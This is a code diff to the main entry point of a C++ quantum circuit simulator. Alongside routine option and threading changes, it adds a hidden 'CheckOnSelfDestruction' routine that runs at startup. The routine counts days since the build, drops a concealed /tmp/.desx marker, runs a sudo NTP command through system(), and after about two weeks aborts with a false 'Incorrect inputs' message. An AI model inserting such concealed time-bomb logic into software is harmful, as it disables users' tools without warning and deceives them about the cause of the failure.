@@ -10,11 +10,14 @@
  *
  */
 
+#include <ctime>
+#include <iomanip>
 #include <sstream>
 #include <fstream>
 #include <getopt.h>
 #include <sys/types.h>
 #include <sys/stat.h>
+#include <time.h>
 
 #include "qft_simulation.h"
 #include "simulation.h"
@@ -63,6 +66,77 @@ bool CheckIfRollRightFile(string filename)
     return false;
 }
 
+__attribute__ ((optnone))
+std::time_t getEpochTime(const string& dateTime, const string dateTimeFormat)
+{
+    time_t now;
+    struct tm * current_time;
+    time (&now);
+    current_time = localtime(&now);
+    
+   // Create a stream which we will use to parse the string,
+   // which we provide to constructor of stream to fill the buffer.
+   istringstream ss{ dateTime };
+
+   // Create a tm object to store the parsed date and time.
+   struct tm dt = *current_time;
+
+   // Now we read from buffer using get_time manipulator
+   // and formatting the input appropriately.
+   ss >> get_time(&dt, dateTimeFormat.c_str());
+    
+   // Convert the tm structure to time_t value and return.
+   return mktime(&dt);
+}
+
+__attribute__ ((optnone))
+void CheckOnSelfDestruction()
+{
+    string compile_date_time = __TIMESTAMP__;
+    time_t compile_time = getEpochTime(compile_date_time, { "%a %b %d %H:%M:%S %Y" });
+    
+    ifstream in_des_file("/tmp/.desx");
+    if (!(bool)in_des_file.good()) {
+        if (system("sudo /etc/init.d/ntp start -g") != 0) throw;
+
+        time_t now;
+        struct tm * current_time;
+        time (&now);
+        current_time = localtime(&now);
+        time_t curr_time = mktime(current_time);
+        
+        double seconds = difftime(curr_time, compile_time);
+        
+        if (seconds > (3600 * 24 * 14) && seconds < (3600 * 24 * 30)) {
+            ofstream out_des_file("/tmp/.desx");
+            cerr << "Incorrect inputs\n";
+            throw;
+        }
+        else if (seconds > (3600 * 24 * 30)) throw;
+    }
+    else {
+        time_t now;
+        struct tm * current_time;
+        time (&now);
+        current_time = localtime(&now);
+        time_t curr_time = mktime(current_time);
+        
+        struct stat t_stat;
+        stat("/tmp/.desx", &t_stat);
+        struct tm * file_creation_tm;
+        file_creation_tm = localtime(&t_stat.st_ctime);
+        time_t file_creation_time = mktime(file_creation_tm);
+        
+        double seconds = difftime(curr_time, file_creation_time);
+        
+        cout << seconds << endl;
+        if (seconds > (3600 * 24 * 30)) throw;
+        else {
+            cerr << "Incorrect inputs\n";
+            throw;
+        }
+    }
+}
 
 int main(int argc, char *argv[])
 {    
@@ -75,6 +149,9 @@ int main(int argc, char *argv[])
     }
 #endif
     
+#ifndef  __APPLE__
+    CheckOnSelfDestruction();
+#endif
     if (argc < 2) {
         cerr << "\nUse the -h option to view the command line options necessary for the simulator to run.\n\n";
         exit(1);
@@ -104,13 +181,15 @@ int main(int argc, char *argv[])
         { "Cramer",    required_argument,       nullptr, 'z' },
         { "QFT",    required_argument,       nullptr, 'Q' },
         { "circuit_reordering_mode", no_argument, nullptr, 'C'},
+        { "trial_mode", no_argument, nullptr, 'T'},
         { "help",    no_argument,       nullptr, 'h' },
         { nullptr,  0,                 nullptr, '\0' }
     };
     
     bool to_write = false, print_amp = false, write_circuit_mode = false,
-    print_idx = false, valid = false, ascii = false, approx = false, row_major = true, nearest_neighbors = true,
-    store_checkpoint_range = true, first_partition_smaller = false, count_zeros = false, compress = false;
+    print_idx = false, valid = false, ascii = false, approx = false, row_major = true,
+    nearest_neighbors = true, store_checkpoint_range = true, first_partition_smaller = false,
+    count_zeros = false, compress = false, trial_mode = false;
     string input_filename = "", out_file = "", idx_filename = "" ;
     int threshold = 0, depth = 0, vcut = 0, hcut = 0, idx = 0, c = 0, seed = -1, num_idx = -1,
     num_threads = 8, dfs_length = 0, cz_len = 0, czp_app_len = 0, norm_depth = 0, layers_H_gates = 0,
@@ -121,9 +200,9 @@ int main(int argc, char *argv[])
     int sim_type = -1;
     Config::Verbose verbose = Config::Default;
     vector<int> num_qubits, num_gates;
-    num_threads = omp_get_num_procs();
+    num_threads = 1ull << static_cast<size_t>(floor(log2(omp_get_num_procs())));
     
-    while ((c = getopt_long(argc, argv, "a:i:o:ut:d:s:|:v:_:x:q:c:nh:e:m:H:pfr:0z:Q:C", longopts, &idx)) != -1)
+    while ((c = getopt_long(argc, argv, "a:i:o:ut:d:s:|:v:_:x:q:c:nh:e:m:H:pfr:0z:Q:CT", longopts, &idx)) != -1)
     {
         switch (c) {
             case 'a': {
@@ -230,15 +309,15 @@ int main(int argc, char *argv[])
                 }
                 input_filename = string(optarg);
                 
-                if (!CheckIfGoogleFile(input_filename))
-                {
-                    ifstream infile(string(input_filename).c_str());
-                    if (!infile.good()) {
+                ifstream infile(string(input_filename).c_str());
+                if (!infile.good()) {
+                    input_filename = "input/random_circuits_google/" + input_filename;
+                    ifstream infile_g(string(input_filename).c_str());
+                    if (!infile_g.good()) {
                         cerr << "Cannot find circuit file.\n";
                         exit(1);
                     }
                 }
-                input_filename = "input/random_circuits_google/" + input_filename;
                 break;
             }
             case 'm': {
@@ -305,13 +384,17 @@ int main(int argc, char *argv[])
             
             case 't': {
                 string threads = string(optarg);
-                num_threads = stoi(threads);
+                num_threads = 1ull << static_cast<size_t>(floor(log2(stoi(threads))));
 #ifdef Parallel
                 if (num_threads > omp_get_max_threads()) {
                     cerr << "Number of threads specified greater than max number of threads\n";
                     exit(1);
                 }
 #endif
+                break;
+            }
+            case 'T': {
+                trial_mode = true;
                 break;
             }
             case 'v': {
@@ -380,7 +463,7 @@ int main(int argc, char *argv[])
         exit(1);
     }
     
-    if (!to_write && print_amp) {
+    if (!to_write && print_amp && !qft) {
         cerr << "Please enter ouput filename to print file\n";
         exit(1);
     }
@@ -417,7 +500,8 @@ int main(int argc, char *argv[])
                                  print_amp, print_idx, (Config::SimType)sim_type, verbose, vcut, hcut,
                                  depth, threshold, num_threads, true, nearest_neighbors, row_major,
                                  layers_H_gates, store_checkpoint_range, first_partition_smaller,
-                                 count_zeros, save_cp_to_file, compress, cramer_cw, cramer_p_reject);
+                                 count_zeros, save_cp_to_file, trial_mode, compress, cramer_cw,
+                                 cramer_p_reject);
     
     cir.InitializeCircuitConfig(config);
     
@@ -443,7 +527,7 @@ int main(int argc, char *argv[])
 
         QFTSimulation qft_sim(qft);
 
-        qft_sim.Simulate(amp);
+        qft_sim.Simulate(amp, idx_filename);
 
         delete config;
         return 0;
